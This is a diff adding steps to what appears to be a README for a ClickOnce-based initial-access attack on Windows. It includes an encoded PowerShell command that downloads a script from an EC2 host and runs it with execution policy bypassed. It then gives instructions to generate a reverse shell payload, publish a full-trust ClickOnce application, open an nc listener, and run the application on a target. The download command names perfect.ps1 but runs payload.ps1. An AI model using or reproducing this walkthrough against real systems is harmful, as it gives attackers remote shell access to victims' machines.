@@ -26,3 +26,20 @@ static class Program {
 ```
 echo "Invoke-WebRequest -Uri 'http://ec2-3-253-172-6.eu-west-1.compute.amazonaws.com:80/perfect.ps1' -OutFile 'perfect.ps1'; powershell -ExecutionPolicy Bypass -File 'payload.ps1'" | iconv -t UTF-16LE | base64 -w 0
 ```
+
+5. You have to host the perfect.ps1, go to https://www.revshells.com, change the reverse shell IP to the public IP and port as 9999.
+6. Create a Powershell base64 payload, copy and save it in the EC2 instance.
+7. Open port 9999 from the security group for the public IP.
+
+## 2. Publishing the exploit
+
+1. Go to Visual Studio on the Windows machine.
+2. Right click, choose **Properties**, then **Security**, Enable **ClickOnce Security Settings, This is a full trust application**.
+3. This application is available offline and startable from Start Menu, click **Publish**.
+
+## 3. Exploitation
+
+1. Go to your EC2 Instance, make sure there is an inbound rule entry in the security groups for port 9999 for only the public IP of the target device that will be used.
+2. Start the listener with ```nc -lnvp 9999```
+3. Execute the _lscript.application_ file on the target device.
+4. Check the listener.
